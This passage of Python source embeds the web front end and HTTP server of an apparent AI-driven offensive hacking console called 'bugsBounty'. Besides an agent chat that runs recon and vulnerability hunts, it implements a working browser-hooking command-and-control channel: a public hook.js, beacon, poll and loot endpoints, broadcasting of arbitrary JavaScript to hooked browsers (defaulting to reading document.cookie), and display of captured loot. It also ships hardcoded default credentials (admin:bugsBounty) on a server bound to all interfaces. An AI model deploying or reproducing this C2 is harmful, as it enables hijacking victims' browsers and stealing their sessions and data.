$('chatInput').addEventListener('focus', () => setTimeout(() => scrollToBottom(true), 260));
if (window.visualViewport) {
  window.visualViewport.addEventListener('resize', () => scrollToBottom(true));
}
window.addEventListener('orientationchange', () => setTimeout(() => scrollToBottom(true), 250));

/* ---------------- scroll ---------------- */
function nearBottom() {
  const el = $('chatScroll');
  return (el.scrollHeight - el.scrollTop - el.clientHeight) < 160;
}
function scrollToBottom(force) {
  const el = $('chatScroll');
  if (force || nearBottom()) el.scrollTop = el.scrollHeight;
  syncJump();
}
function syncJump() {
  const el = $('chatScroll'), btn = $('jumpBtn');
  if (!el || !btn) return;
  btn.classList.toggle('show', (el.scrollHeight - el.scrollTop - el.clientHeight) > 240);
}
$('chatScroll').addEventListener('scroll', syncJump, { passive: true });

/* Mobile: swipe the sidebar away, Esc closes whatever is open */
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') { document.body.classList.remove('sb-open'); if (panel) closePanel(); }
});
let _touchX = 0, _touchY = 0;
document.addEventListener('touchstart', e => {
  if (e.touches.length !== 1) return;
  _touchX = e.touches[0].clientX; _touchY = e.touches[0].clientY;
}, { passive: true });
document.addEventListener('touchend', e => {
  if (!document.body.classList.contains('sb-open') || e.changedTouches.length !== 1) return;
  const dx = e.changedTouches[0].clientX - _touchX;
  const dy = Math.abs(e.changedTouches[0].clientY - _touchY);
  if (dx < -55 && dy < 70) document.body.classList.remove('sb-open');
}, { passive: true });

/* ---------------- render ---------------- */
function render() {
  if (!state) return;
  const st = state.status || {};
  const totals = (state.telemetry && state.telemetry.totals) || {};
  const stats = (state.agent && state.agent.stats) || {};

  $('kHttp').textContent = totals.http_requests || 0;
  $('kBin').textContent = totals.bin_runs || 0;
  $('kWaf').textContent = totals.waf_bypasses || 0;
  $('kVer').textContent = st.verified_count || 0;
  $('kDis').textContent = st.disproved_count || 0;

  const stateEl = $('agentState');
  const agentState = stats.state || 'IDLE';
  const stages = state.stages || [];
  const curStage = stages.find(s => s.key === st.current_stage) || stages.find(s => s.state === 'running');
  stateEl.textContent = st.running_job
    ? (curStage ? `${curStage.index}/${stages.length} ${curStage.label}` : 'working')
    : agentState.toLowerCase();
  stateEl.className = 'pill ' + (st.running_job ? 'RUNNING' : agentState);

  $('llmBadge').textContent = (st.llm && (st.llm.display_mode || st.llm.active_provider)) || 'groq';

  if (st.target && $('targetInput') !== document.activeElement) $('targetInput').value = st.target;
  const hint = $('targetHint');
  if (st.target) {
    hint.textContent = st.target + (st.lab_running ? ' · local lab' : '');
    hint.classList.add('set');
  } else {
    hint.textContent = 'No target set';
    hint.classList.remove('set');
  }

  renderStages();
  renderKpis();
  renderThread();
  renderTyping();
  if (panel) renderPanel();
}

function renderStages() {
  const stages = state.stages || [];
  const cur = (state.status && state.status.current_stage) || '';
  const done = stages.filter(s => s.state === 'done').length;
  $('stageProgress').textContent = `${done}/${stages.length || 6}`;
  $('stageList').innerHTML = stages.map(s => `
    <button class="stage-row ${esc(s.state)} ${s.key === cur ? 'running' : ''}" onclick="run('/${esc(s.key)}')" title="${esc(s.task)}">
      <span class="dot">${s.state === 'done' ? '✓' : (s.state === 'running' || s.key === cur ? '▸' : s.index)}</span>
      <span>${esc(s.label)}</span>
      <small>${esc(s.state)}</small>
    </button>`).join('');
}

function renderKpis() {
  const st = state.status || {};
  const stats = (state.agent && state.agent.stats) || {};
  $('miniKpis').innerHTML = `
    <div>surface<b>${st.surface_urls || 0}</b></div>
    <div>leads<b>${st.raw_count || 0}</b></div>
    <div>verified<b>${st.verified_count || 0}</b></div>
    <div>disproved<b>${st.disproved_count || 0}</b></div>
    <div>chains<b>${st.chains_count || 0}</b></div>
    <div>tools<b>${stats.bin_runs || 0}</b></div>`;
}

function msgRow(m) {
  const isUser = (m.speaker === 'YOU');
  const kind = m.kind || 'info';
  const tag = `<span class="kindtag ${esc(kind)}">${esc(KIND_LABEL[kind] || kind)}</span>`;
  const stageTag = m.stage_label ? `<span class="kindtag">${esc(m.stage_label)}</span>` : '';
  const time = new Date((m.ts || 0) * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  return `
    <div class="msg-row ${isUser ? 'user' : ''}">
      <div class="avatar ${isUser ? 'user' : 'agent'}">${isUser ? 'YOU' : 'AI'}</div>
      <div class="bubble-col">
        <div class="who">${isUser ? '' : '<strong style="color:' + AGENT_COLOR + '">AGENT</strong>'} ${tag} ${stageTag}
          <span style="margin-left:${isUser ? '6px' : 'auto'}">${time}</span></div>
        <div class="bubble ${esc(kind)}">${md(m.text)}</div>
      </div>
    </div>`;
}

function renderThread() {
  const msgs = state.transcript || [];
  const sig = msgs.length + ':' + (msgs.length ? (msgs[msgs.length - 1].ts + '|' + msgs[msgs.length - 1].text.length) : '') +
              ':' + (state.stages || []).map(s => s.state).join('');
  if (sig === lastThreadSig) return;
  const stick = nearBottom();
  lastThreadSig = sig;

  const thread = $('chatThread');
  if (!msgs.length) {
    thread.innerHTML = heroHtml();
    return;
  }

  thread.innerHTML = msgs.map(m => {
    if (m.kind === 'stage') {
      return `<div class="activity"><span class="atag">stage</span><span>${md(m.text)}</span></div>`;
    }
    return msgRow(m);
  }).join('');
  scrollToBottom(stick || msgs.length <= 4);
}

function heroHtml() {
  const st = state.status || {};
  return `
    <div class="hero">
      <h1>What are we hacking today?</h1>
      <p>Give me a target and I'll do the rest — map its surface, hunt for bugs, chase down the ones I find,
         and only report what survives deterministic verification.${st.lab_running ? ' The local VulnCorp lab is already running.' : ''}</p>
      <div class="hero-grid">
        <button class="hero-card" onclick="$('targetInput').focus()">
          <b>1. Set the target</b><code>/target site.com</code>
          <small>Any host or URL you are authorized to test.</small>
        </button>
        <button class="hero-card" onclick="run('/recon')">
          <b>2. Recon</b><code>/recon</code>
          <small>Subdomains, live hosts, WAF vendor, crawl, hidden params, dirbust, historical URLs.</small>
        </button>
        <button class="hero-card" onclick="run('/hunt')">
          <b>3. Hunt</b><code>/hunt</code>
          <small>SQLi, XSS, SSRF, CMDi, SSTI, LFI, 403 bypasses and exposure templates.</small>
        </button>
        <button class="hero-card" onclick="run('/auto')">
          <b>4. Let me drive</b><code>/auto</code>
          <small>Recon → hunt → pursue every lead with heavy tools → verify → chains → report.</small>
        </button>
      </div>
    </div>`;
}

function renderTyping() {
  const st = state.status || {};
  const stats = (state.agent && state.agent.stats) || {};
  let el = $('typingRow');
  if (!st.running_job) { if (el) el.remove(); return; }
  if (!el) {
    el = document.createElement('div');
    el.id = 'typingRow';
    $('chatThread').appendChild(el);
  }
  const cur = (state.stages || []).find(s => s.key === st.current_stage);
  const detail = [cur ? `${cur.index}/${(state.stages || []).length} ${cur.label}` : '',
                  stats.current_tool ? '`' + stats.current_tool + '`' : '',
                  stats.current_task || ''].filter(Boolean).join(' · ');
  el.className = 'typing';
  el.innerHTML = `<span class="dots"><i></i><i></i><i></i></span>
    <span><b style="color:var(--fg)">${esc(st.running_job.command)}</b> ${md(detail)}</span>`;
  scrollToBottom(false);
}

/* ---------------- panels ---------------- */
function openPanelRender(name) { return panel === name; }

function panelSignature() {
  const st = state.status || {};
  const t = state.telemetry || {};
  const b = state.beef || {};
  const o = state.oob || {};
  return [
    panel, st.current_stage, st.verified_count, st.disproved_count, st.chains_count,
    (t.events || []).length, (t.active_processes || []).length, (t.recent_processes || []).length,
    (b.loot || []).length, (b.command_log || []).length, (b.sessions_list || []).length,
    (o.hits || []).length, selectedSid, toolsCache.length, JSON.stringify(st.llm || {})
  ].join('|');
}

function renderPanel() {
  const body = $('panelBody');
  if (!panel) return;
  const sig = panelSignature();
  if (sig === lastPanelSig) return;
  lastPanelSig = sig;

  const typedJs = ($('customJs') && $('customJs').value) || '';
  const scrollTop = body.scrollTop;

  if (panel === 'ops') body.innerHTML = opsPanel();
  else if (panel === 'findings') body.innerHTML = findingsPanel();
  else if (panel === 'beef') body.innerHTML = beefPanel();
  else if (panel === 'arsenal') body.innerHTML = arsenalPanel();
  else if (panel === 'keys') body.innerHTML = keysPanel();
  else if (panel === 'about') body.innerHTML = aboutPanel();

  if (typedJs && $('customJs')) $('customJs').value = typedJs;
  body.scrollTop = scrollTop;
}

function opsPanel() {
  const st = state.status || {};
  const stats = (state.agent && state.agent.stats) || {};
  const t = state.telemetry || {};
  const act = t.active_processes || [];
  const rec = t.recent_processes || [];
  const evs = [...(t.events || [])].reverse().slice(0, 90);
  const wm = state.waf_mutex || {};
  const cur = (state.stages || []).find(s => s.key === st.current_stage);

  return `
    <div class="card ok">
      <div class="row"><strong style="color:${AGENT_COLOR}">AGENT — ${esc((state.agent && state.agent.role) || '')}</strong>
        <span class="kindtag ${esc(stats.state || 'IDLE')}">${esc(stats.state || 'IDLE')}</span></div>
      <div style="margin-top:6px;color:#bde0fe">${esc(stats.current_task || 'Standing by')}</div>
      <div style="margin-top:4px;color:var(--muted);font-size:11px">tool <code>${esc(stats.current_tool || 'none')}</code>
        ${cur ? ' · stage ' + cur.index + '/' + (state.stages || []).length + ' ' + esc(cur.label) : ''}</div>
      <div class="row" style="margin-top:8px;color:var(--muted);font-size:11px">
        <span>HTTP ${stats.http_requests || 0}</span><span>.bin ${stats.bin_runs || 0}</span>
        <span>WAF ${stats.waf_bypasses || 0}/${stats.waf_blocks || 0}</span><span>verified ${stats.verified_wins || 0}</span>
      </div>
    </div>
    <h4>Running subprocesses (${act.length})</h4>
    ${act.length ? act.map(p => `<div class="evrow"><span class="cat">live</span><div class="txt"><code>${esc(p.cmd)}</code><small>${Math.round(p.elapsed_ms)} ms</small></div></div>`).join('') : '<div class="empty">Nothing running right now.</div>'}
    <h4>Recent .bin runs</h4>
    ${rec.length ? rec.slice(0, 18).map(p => `<div class="evrow"><span class="cat">${esc(p.status)}</span><div class="txt"><code>${esc(p.cmd)}</code><small>${Math.round(p.duration_ms)} ms</small></div></div>`).join('') : '<div class="empty">No tool runs yet.</div>'}
    <h4>PAYLOAD_MUTEX state</h4>
    <pre class="code">${esc(JSON.stringify(wm, null, 2))}</pre>
    <h4>Live event stream</h4>
    ${evs.length ? evs.map(e => `<div class="evrow"><span class="cat">${esc(e.category)}</span><div class="txt">${esc(e.title)}<small>${esc(e.detail || '')}</small></div></div>`).join('') : '<div class="empty">No events yet.</div>'}`;
}

function findingsPanel() {
  const st = state.status || {};
  const verified = state.verified || [];
  const disproved = state.disproved || [];
  const chains = state.chains || [];
  const pocs = state.pocs || [];
  const pocById = {};
  pocs.forEach(p => { pocById[p.finding_id] = p; });

  return `
    <div class="card"><div class="row"><strong>${st.verified_count || 0} verified</strong>
      <span style="color:var(--muted)">${st.disproved_count || 0} disproved · ${st.chains_count || 0} chains · ${pocs.length} PoCs</span></div>
      ${st.report_path ? `<div style="margin-top:6px;color:var(--muted);font-size:11px">report: <code>${esc(st.report_path)}</code></div>` : ''}
    </div>
    <h4>Verified bugs</h4>
    ${verified.length ? verified.map(f => {
      const poc = pocById[f.id] || {};
      return `<div class="card ok">
        <div class="row"><strong style="color:var(--green)">[${esc((f.severity || '').toUpperCase())}] ${esc(f.type)}</strong><span style="color:var(--muted)">CVSS ${esc(f.cvss_score || '')}</span></div>
        <div style="color:var(--cyan);word-break:break-all;margin-top:4px">${esc(f.url)}</div>
        <div style="color:var(--muted);font-size:11px;margin-top:3px">param <code>${esc(f.parameter || 'n/a')}</code> · detected by ${esc(f.detected_by || 'n/a')}${(f.escalated_with || []).length ? ' · confirmed with ' + esc((f.escalated_with || []).join(', ')) : ''}</div>
        <div style="margin-top:5px">${esc(f.evidence || '')}</div>
        ${poc.curl ? `<pre class="code">${esc(poc.curl)}</pre>` : ''}
      </div>`;
    }).join('') : '<div class="empty">No verified bugs yet — run /hunt or /auto.</div>'}
    <h4>Disproved claims</h4>
    ${disproved.length ? disproved.map(f => `<div class="card bad">
        <strong style="color:var(--red)">${esc(f.type)} @ ${esc(f.url)}</strong>
        <div style="color:#ffb3c1;font-size:11.5px;margin-top:4px">${esc((f.critic_notes || []).join(' | '))}</div>
      </div>`).join('') : '<div class="empty">No false positives disproved yet.</div>'}
    <h4>Attack chains</h4>
    ${chains.length ? chains.map(c => `<div class="card critical">
        <strong style="color:var(--magenta)">${esc(c.title || c.name)}</strong>
        <div style="color:var(--yellow);font-size:11px;margin-top:3px">impact: ${esc(c.impact || c.severity || '')}</div>
        <pre class="code">${esc((c.steps || []).join('\n→ '))}</pre>
      </div>`).join('') : '<div class="empty">No chains built yet.</div>'}`;
}

function beefPanel() {
  const b = state.beef || {};
  const sessions = b.sessions_list || [];
  const modules = b.modules || [];
  const loot = b.loot || [];
  const log = b.command_log || [];
  const oob = (state.oob && state.oob.hits) || [];
  const hook = window.location.href.split('?')[0].split('#')[0].replace(/\/+$/, '') + '/beef/hook.js';

  return `
    <div class="card">
      <b>Browser hook stager</b>
      <pre class="code">${esc(hook)}</pre>
      <div class="panel-actions" style="margin-top:6px">
        <button onclick="spawnVictim()">🪝 Hook demo victim</button>
        <button onclick="navigator.clipboard && navigator.clipboard.writeText('${esc(hook)}')">Copy hook.js</button>
        <button onclick="mintOob()">📡 Mint + test OOB</button>
      </div>
    </div>
    <h4>Hooked browsers (${sessions.length})</h4>
    <div class="panel-actions">
      <button class="${selectedSid === '*' ? 'primary' : ''}" onclick="selectSid('*')">* broadcast</button>
      ${sessions.map(s => `<button class="${selectedSid === s.sid ? 'primary' : ''}" onclick="selectSid('${esc(s.sid)}')">${s.online ? '🟢' : '🟡'} ${esc(s.sid)}</button>`).join('')}
    </div>
    <h4>Attack modules</h4>
    ${modules.length ? modules.map(m => `<button class="btn" style="width:100%;text-align:left;margin-bottom:6px" onclick="beefModule(${JSON.stringify(m.id)}, ${JSON.stringify(m.name)}, ${JSON.stringify(m.js)})">
        <b>${esc(m.name)}</b> <span class="kindtag">${esc(m.risk)}</span><br><small style="color:var(--muted)">${esc(m.description)}</small>
      </button>`).join('') : '<div class="empty">No modules loaded.</div>'}
    <h4>Custom JavaScript</h4>
    <textarea id="customJs" rows="3">({title: document.title, cookies: document.cookie, ua: navigator.userAgent})</textarea>
    <button class="btn primary" onclick="runCustomJs()">⚡ Execute on ${selectedSid === '*' ? 'all hooked browsers' : esc(selectedSid)}</button>
    <h4>Captured loot (${loot.length})</h4>
    ${loot.length ? loot.slice().reverse().map(l => `<div class="card ok"><div class="row"><strong>${esc(l.kind)} · ${esc(l.sid)}</strong><span style="color:var(--muted)">${new Date((l.ts || 0) * 1000).toLocaleTimeString()}</span></div><pre class="code">${esc(JSON.stringify(l.data, null, 2))}</pre></div>`).join('') : '<div class="empty">No loot captured yet.</div>'}
    <h4>Command results</h4>
    ${log.length ? log.slice().reverse().map(c => `<div class="card"><div class="row"><strong>${esc(c.label)} → ${esc(c.sid)}</strong><span class="kindtag">${esc(c.status)}</span></div>${c.output ? `<pre class="code">${esc(c.output)}</pre>` : '<div class="empty">waiting for the browser to poll…</div>'}</div>`).join('') : '<div class="empty">No commands queued.</div>'}
    <h4>OOB callbacks (${oob.length})</h4>
    ${oob.length ? oob.slice().reverse().map(h => `<div class="card high"><strong>${esc(h.method || 'HIT')} ${esc(h.path || h.token)}</strong><div style="color:var(--muted);font-size:11px">${esc(h.remote || '')} · ${esc(h.channel || '')}</div></div>`).join('') : '<div class="empty">No callbacks recorded.</div>'}
    <div class="empty">The victim browser sandbox is docked at the bottom of this panel.</div>`;
}

function arsenalPanel() {
  if (!toolsCache.length) return '<div class="empty">Loading arsenal…</div>';
  const ready = toolsCache.filter(t => t.status === 'READY').length;
  return `<div class="card"><b>${ready}/${toolsCache.length} tools READY</b></div>` +
    toolsCache.map(t => `<div class="card"><div class="row"><strong style="color:var(--cyan)">${esc(t.name)}</strong>
      <span style="color:${t.status === 'READY' ? 'var(--green)' : 'var(--red)'}">${esc(t.source)} :: ${esc(t.status)}</span></div>
      <div style="color:var(--muted);font-size:10.5px;margin-top:3px">${esc(t.category || '')} ${esc((t.version || '').slice(0, 90))}</div></div>`).join('');
}

function keysPanel() {
  const llm = (state.status && state.status.llm) || {};
  return `
    <div class="card">Current: provider <code>${esc(llm.active_provider || '')}</code> · model <code>${esc(llm.active_model || '')}</code><br>
      endpoint <code>${esc(llm.base_url || '')}</code><br>key <code>${esc(llm.api_key_masked || 'none')}</code> · available ${llm.available ? 'yes' : 'no (deterministic mode)'}</div>
    <h4>Set provider & key</h4>
    <select id="provSelect">
      <option value="groq">Groq Cloud — https://api.groq.com/openai/v1</option>
      <option value="xai">xAI — https://api.x.ai/v1</option>
      <option value="openai">OpenAI — https://api.openai.com/v1</option>
      <option value="ollama">Local Ollama — http://localhost:11434</option>
    </select>
    <input id="apiKeyInput" type="password" placeholder="Paste API key (gsk_… / xai-… / sk-…)" />
    <input id="modelInput" placeholder="Optional model override" />
    <button class="btn primary" onclick="saveKey()">Save & activate</button>
    <div id="keyStatus" class="empty" style="margin-top:8px"></div>`;
}

function aboutPanel() {
  return `
    <div class="card">
      <b>Talk to one agent</b>
      <div style="color:var(--muted);margin-top:6px;line-height:1.6">
        Everything you type goes to the single <code>AGENT</code>. It decides what to run and narrates what it finds.
      </div>
    </div>
    <h4>Commands</h4>
    <div class="card"><code>/target site.com</code> — set the target<div class="empty">Any host or URL you are authorized to test.</div></div>
    <div class="card"><code>/recon</code> — attack-surface mapping<br><small style="color:var(--muted)">subfinder · assetfinder · dnsx · httpx · wafw00f · katana · hakrawler · arjun · ffuf · gobuster · gau · waybackurls · paramspider</small></div>
    <div class="card"><code>/hunt</code> — find vulnerabilities<br><small style="color:var(--muted)">SQLi · XSS · SSRF · CMDi · SSTI · LFI · 403 bypass · exposure templates</small></div>
    <div class="card"><code>/auto</code> — recon → hunt → pursue<br><small style="color:var(--muted)">The agent escalates every lead with heavy tools, verifies it deterministically, keeps what is real, builds chains and writes the report.</small></div>
    <div class="card"><code>/verify</code> <code>/chains</code> <code>/report</code> <code>/status</code></div>
    <h4>Natural language works too</h4>
    <div class="card">“map everything on this host”, “go find and exploit bugs”, “what did you verify so far?”</div>`;
}

/* ---------------- panel actions ---------------- */
function selectSid(sid) { selectedSid = sid; lastPanelSig = ''; renderPanel(); }
function spawnVictim() {
  const frame = $('victimFrame');
  if (frame) frame.src = 'beef/victim?t=' + Date.now();
}
async function beefModule(id, name, js) {
  await api('api/beef/command', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sid: selectedSid, module: id, label: name, js })
  });
  setTimeout(refreshState, 400);
  setTimeout(refreshState, 1300);
}
async function runCustomJs() {
  const js = ($('customJs') && $('customJs').value.trim()) || '';
  if (!js) return;
  await beefModule('custom_js', 'Custom JS', js);
}
async function mintOob() {
  await api('api/oob/test', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
  await refreshState();
}
async function saveKey() {
  const provider = $('provSelect').value;
  const api_key = $('apiKeyInput').value.trim();
  const model = $('modelInput').value.trim();
  const out = await api('api/llm', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ provider, api_key, model })
  });
  $('apiKeyInput').value = '';
  const el = $('keyStatus');
  if (el) el.innerHTML = `Active: <b>${esc(out.llm.active_provider)}</b> (${esc(out.llm.active_model)}) · key ${esc(out.llm.api_key_masked)}`;
  await refreshState();
}

/* ---------------- polling ---------------- */
async function refreshState() {
  if (pollInFlight) return;
  pollInFlight = true;
  try {
    const incoming = await api('api/state?since=' + lastEventSeq);
    if (incoming && incoming.telemetry) {
      const delta = incoming.telemetry.events || [];
      if (lastEventSeq === 0) eventsBuffer = delta.slice(-280);
      else if (delta.length) eventsBuffer = eventsBuffer.concat(delta).slice(-280);
      if (typeof incoming.telemetry.latest_seq === 'number') lastEventSeq = incoming.telemetry.latest_seq;
      incoming.telemetry.events = eventsBuffer;
    }
    state = incoming;
    render();
  } catch (e) {
    /* transient network hiccup — keep polling */
  } finally {
    pollInFlight = false;
  }
}

function scheduleNextPoll() {
  clearTimeout(pollTimer);
  const delay = document.hidden ? 2500 : 800;
  pollTimer = setTimeout(async () => { await refreshState(); scheduleNextPoll(); }, delay);
}

document.addEventListener('visibilitychange', () => { if (!document.hidden) { scheduleNextPoll(); refreshState(); } });

api('api/tools').then(d => { toolsCache = d.tools || []; }).catch(() => {});
refreshState().then(() => {
  autoGrow();
  $('chatInput').focus();
  scheduleNextPoll();
});
</script>
</body>
</html>
"""

_DISCONNECT_ERRNOS = {
    errno.EPIPE,
    errno.ECONNRESET,
    errno.ECONNABORTED,
    errno.ETIMEDOUT,
    errno.ENOTCONN,
    errno.ESHUTDOWN,
}


def _is_client_disconnect(exc: BaseException | None) -> bool:
    if isinstance(exc, (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, TimeoutError, EOFError)):
        return True
    if isinstance(exc, OSError) and getattr(exc, "errno", None) in _DISCONNECT_ERRNOS:
        return True
    return False


class QuietThreadingHTTPServer(ThreadingHTTPServer):
    """Multi-threaded HTTP server that suppresses noisy tracebacks when WAN/scanner clients reset sockets."""

    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        _, exc, _ = sys.exc_info()
        if _is_client_disconnect(exc):
            return
        super().handle_error(request, client_address)


def _verify_basic_auth(auth_header: str | None, expected_user: str, expected_pass: str) -> bool:
    if not auth_header or not auth_header.startswith("Basic "):
        return False
    try:
        decoded = base64.b64decode(auth_header[6:].strip()).decode("utf-8", errors="strict")
    except Exception:
        return False
    if ":" not in decoded:
        return False
    got_user, got_pass = decoded.split(":", 1)
    return secrets.compare_digest(got_user, expected_user) and secrets.compare_digest(got_pass, expected_pass)


def start_warroom_server(
    host: str = "0.0.0.0",
    port: int = 8787,
    target: str | None = None,
    auto_lab: bool = False,
    block: bool = True,
    auth_user: str | None = None,
    auth_pass: str | None = None,
    require_auth: bool = True,
):
    CFG["agent_streaming"] = True
    ui_user = auth_user if auth_user is not None else os.environ.get("BUGHUNTER_UI_USER", "admin")
    ui_pass = auth_pass if auth_pass is not None else os.environ.get("BUGHUNTER_UI_PASS", "bugsBounty")

    session = WarRoomSession(target=target)
    if auto_lab and not session.target:
        session.start_lab()
    beef_srv = get_beef_server()
    oob_mgr = get_oob_manager()
    tools_snapshot = ToolRegistry.audit()

    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, fmt, *args):
            return

        def _require_operator_auth(self) -> bool:
            if not require_auth:
                return True
            if _verify_basic_auth(self.headers.get("Authorization"), ui_user, ui_pass):
                return True
            body = b'{"error":"Authentication required (default Basic Auth -> admin:bugsBounty)"}'
            try:
                self.send_response(401)
                self.send_header('WWW-Authenticate', 'Basic realm="bugsBounty #basement-ops"')
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            except OSError as exc:
                if not _is_client_disconnect(exc):
                    raise
            return False

        def _raw_reply(self, status: int, content_type: str, data: bytes):
            use_gzip = len(data) >= 1400 and "gzip" in (self.headers.get("Accept-Encoding") or "").lower()
            payload = gzip.compress(data, compresslevel=5) if use_gzip else data
            try:
                self.send_response(status)
                self.send_header("Content-Type", content_type)
                if use_gzip:
                    self.send_header("Content-Encoding", "gzip")
                    self.send_header("Vary", "Accept-Encoding")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Access-Control-Allow-Headers", "*")
                self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)
            except OSError as exc:
                if _is_client_disconnect(exc):
                    self.close_connection = True
                    return
                raise

        def _json(self, status: int, data: dict):
            self._raw_reply(status, "application/json; charset=utf-8", json.dumps(data, default=str).encode("utf-8"))

        def do_OPTIONS(self):
            self._json(200, {"ok": True})

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            path = parsed.path.rstrip("/") or "/"
            qs = urllib.parse.parse_qs(parsed.query)

            # Public Victim Hook & OOB Callback Endpoints (must remain open to hooked browsers / SSRF targets!)
            if path == "/beef/hook.js":
                fid = (qs.get("fid") or ["web-xss"])[0]
                js = beef_srv.render_hook_js(
                    fid=fid,
                    c2_base="",  # auto-derives exact origin + `/beef` from `document.currentScript.src`!
                    remote=self.client_address[0],
                    ua=self.headers.get("User-Agent", ""),
                    referer=self.headers.get("Referer", ""),
                )
                self._raw_reply(200, "application/javascript; charset=utf-8", js.encode("utf-8"))
                return

            if path == "/beef/poll":
                sid = (qs.get("session") or qs.get("sid") or [""])[0]
                self._json(200, beef_srv.handle_poll(sid))
                return

            if path == "/beef/victim":
                self._raw_reply(200, "text/html; charset=utf-8", DEMO_VICTIM_HTML.encode("utf-8"))
                return

            if path.startswith("/oob/"):
                m = re.search(r"/oob/([A-Za-z0-9_-]+)", path)
                tok = m.group(1) if m else "probe"
                oob_mgr.record_hit(tok, "GET", self.path, self.client_address[0], headers=dict(self.headers), channel="web_proxy_oob")
                self._raw_reply(200, "text/plain; charset=utf-8", f"oob-ack:{tok}".encode("utf-8"))
                return

            # All Operator Console Routes Require HTTP Basic Auth (`admin:bugsBounty`)
            if not self._require_operator_auth():
                return

            if path in ("/", "/index.html"):
                self._raw_reply(200, "text/html; charset=utf-8", HTML_PAGE.encode("utf-8"))
                return
            if path == "/api/state":
                since = int((qs.get("since") or ["0"])[0] or 0)
                host_hdr = self.headers.get("Host") or f"127.0.0.1:{httpd.server_address[1]}"
                proto = self.headers.get("X-Forwarded-Proto") or "http"
                self._json(200, session.state_snapshot(since_seq=since, public_hook_url=f"{proto}://{host_hdr}/beef/hook.js"))
                return
            if path == "/api/telemetry":
                since = int((qs.get("since") or ["0"])[0] or 0)
                from core.telemetry import TELEMETRY
                self._json(200, TELEMETRY.snapshot(since_seq=since))
                return
            if path == "/api/beef":
                self._json(200, beef_srv.snapshot())
                return
            if path == "/api/oob":
                self._json(200, oob_mgr.snapshot())
                return
            if path == "/api/tools":
                self._json(200, {"tools": tools_snapshot})
                return
            if path == "/health":
                self._json(200, {"ok": True, "auth_user": ui_user, "status": session.status_dict()})
                return
            self._json(404, {"error": "not found"})

        def do_POST(self):
            parsed = urllib.parse.urlparse(self.path)
            path = parsed.path.rstrip("/")
            qs = urllib.parse.parse_qs(parsed.query)
            length = int(self.headers.get("Content-Length", "0") or 0)
            try:
                raw_body = self.rfile.read(min(length, 131072)).decode("utf-8", errors="ignore") if length else ""
            except OSError as exc:
                if _is_client_disconnect(exc):
                    self.close_connection = True
                    return
                raise
            try:
                body = json.loads(raw_body) if raw_body else {}
            except Exception:
                body = {}

            # Public Victim BeEF Beacons, Command Results & Captured Loot Endpoints
            if path in ("/beef/beacon", "/beef/result", "/beef/loot"):
                sid = (qs.get("sid") or qs.get("session") or [body.get("sid") or body.get("session") or ""])[0]
                fid = (qs.get("fid") or [body.get("fid") or "web-xss"])[0]
                if path == "/beef/beacon":
                    self._json(200, beef_srv.handle_beacon(sid, fid, self.client_address[0], body))
                elif path == "/beef/result":
                    self._json(200, beef_srv.handle_result(sid, body))
                else:
                    self._json(200, beef_srv.handle_loot(sid, fid, self.client_address[0], body))
                return

            # All Operator POST APIs Enforce Basic Auth (`admin:bugsBounty`)
            if not self._require_operator_auth():
                return

            if path == "/api/chat":
                if body.get("async"):
                    out = session.submit_async(body.get("message", ""), speaker_target=body.get("speaker") or None)
                else:
                    out = session.handle_message(body.get("message", ""), speaker_target=body.get("speaker") or None)
                self._json(200, out)
                return

            if path == "/api/reset":
                keep_target = bool(body.get("keep_target", True))
                self._json(200, {"ok": True, "status": session.reset(keep_target=keep_target)})
                return

            if path == "/api/beef/command":
                sid = (body.get("sid") or "*").strip()
                js_code = (body.get("js") or "").strip()
                mod_name = (body.get("module") or "custom_js").strip()
                label = (body.get("label") or mod_name).strip()
                if not js_code:
                    self._json(400, {"error": "Missing js payload"})
                    return
                if sid in ("*", "all", "ALL"):
                    queued = beef_srv.broadcast_command(js_code, module_name=mod_name, label=label)
                    self._json(200, {"ok": True, "broadcast": True, "queued_ids": queued})
                else:
                    cid = beef_srv.queue_command(sid, js_code, module_name=mod_name, label=label)
                    self._json(200, {"ok": True, "cmd_id": cid, "sid": sid})
                return

            if path == "/api/oob/test":
                canary = oob_mgr.generate_canary("ui-test")
                oob_mgr.record_hit(canary["token"], "GET", f"/oob/{canary['token']}?source=ui-self-test", "127.0.0.1", channel="self_test")
                self._json(200, {"ok": True, "canary": canary, "oob": oob_mgr.snapshot()})
                return

            if path == "/api/llm":
                info = configure_api_key(
                    api_key=body.get("api_key") or None,
                    provider=body.get("provider") or None,
                    model=body.get("model") or None,
                    persist=True,
                )
                st_llm = get_llm().status_summary()
                AGENT_BUS.say(
                    f"Updated live LLM config -> provider=`{st_llm['active_provider']}` | model=`{st_llm['active_model']}` | key=`{st_llm['api_key_masked']}`.",
                    kind="info",
                )
                self._json(200, {"ok": True, "info": info, "llm": st_llm})
                return

            self._json(404, {"error": "not found"})

    httpd = QuietThreadingHTTPServer((host, port), Handler)
    if block:
        print(
            f"[bugsBounty] #basement-ops Command Center live on http://{host}:{httpd.server_address[1]} "
            f"(Basic Auth -> {ui_user}:{ui_pass})",
            flush=True,
        )
        httpd.serve_forever()
    else:
        t = threading.Thread(target=httpd.serve_forever, daemon=True)
        t.start()
    return httpd, session
